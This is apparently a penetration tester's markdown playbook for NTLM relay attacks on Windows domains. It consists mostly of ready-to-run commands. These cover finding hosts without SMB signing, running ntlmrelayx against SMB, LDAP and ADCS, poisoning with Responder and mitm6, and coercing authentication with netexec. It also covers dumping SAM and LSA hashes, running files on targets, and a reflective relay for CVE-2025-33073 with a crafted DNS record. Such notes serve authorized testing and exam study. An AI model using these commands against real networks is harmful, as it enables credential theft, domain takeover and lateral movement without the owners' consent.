# NTLM relay

- [ ] Not on the OSCP exam: relay and coercion are kept out as a safe reading; OffSec's pages do not name them
- [ ] Not on the OSCP exam: OffSec bans spoofing, including NBNS, and Responder poisoning

## Before I start
At the pwn-broker prompt: tool install netexec and tool install impacket.
Where signing is required: a host with SMB signing off can be relayed to over SMB, and the LDAP banner shows the DC's signing and channel binding.
nxc smb <Subnet>/<CIDR> --gen-relay-list relay.txt
nxc ldap <DCIP>
- [ ] Responder running at the same time: its SMB and HTTP servers turned off in Responder.conf, so that ntlmrelayx can take those ports, as in :Pb responder
- [ ] The plan follows the account I expect to catch: a DC's machine account to LDAP or ADCS, an administrator to SMB

## The listener
- [ ] The full path for Impacket with sudo: sudo does not search pwn-broker's bin folder
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t smb://<TargetIP> -smb2support
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t ldap://<DCIP> --shadow-credentials -smb2support
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t http://<TargetIP>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
- [ ] In the third line <TargetIP> is the CA server, and not the DC being coerced: a DC's response relayed back to the same DC never works
- [ ] A session in place of a dump: -i, for a shell on 127.0.0.1:11000, or -socks
- [ ] Many targets: -tf relay.txt -w --keep-relaying
- [ ] SMB in and LDAP out, against a DC unpatched for CVE-2019-1040: --remove-mic

## Feed it: poisoning
sudo responder -I tun0
mitm6, after sudo apt install -y mitm6:
sudo mitm6 -d <Domain>
- [ ] With mitm6, ntlmrelayx gets -6 as well

## Feed it: coercion, with any domain credential
nxc smb <TargetIP> -u '<Username>' -p '<Password>' -M coerce_plus -o LISTENER=<LHOST>
- [ ] A method refused: the next one, among PetitPotam, PrinterBug, DFSCoerce and ShadowCoerce: :Pb coercion
- [ ] A DC's machine account relayed to LDAP: shadow credentials or resource-based constrained delegation from there: :Pb shadow-credentials, :Pb delegation
- [ ] A DC's machine account relayed to ADCS web enrolment: a certificate as the DC, then :Pb adcs

## What an SMB relay gives
- [ ] An administrator relayed: SAM and LSA dumped by itself, and the hashes kept and used: :Pb lateral-movement
- [ ] -e with a file of mine runs it on the target instead, and -i gives the shell

## Reflective relay, CVE-2025-33073
- [ ] A target unpatched since June 2025, where SMB signing is not required
dnstool, after sudo apt install -y krbrelayx, adds a DNS name that carries the marshalled target and points at me:
dnstool -u '<Domain>\<Username>' -p '<Password>' <DCIP> --action add -r '<Hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d <LHOST>
sudo /opt/pwn-broker/bin/impacket-ntlmrelayx -t smb://<Hostname>.<Domain> -smb2support --remove-sign-seal
nxc smb <Hostname>.<Domain> -u '<Username>' -p '<Password>' -M coerce_plus -o LISTENER=<Hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
- [ ] The DNS record removed afterwards: the dnstool line again, with --action remove and no -d

## Clean up and next
- [ ] Responder.conf put back, mitm6 stopped, which takes a while to wear off, and my DNS records removed
- [ ] A relay that ended in delegation: :Pb delegation
- [ ] Hashes cracked or passed: :Pb windows-creds
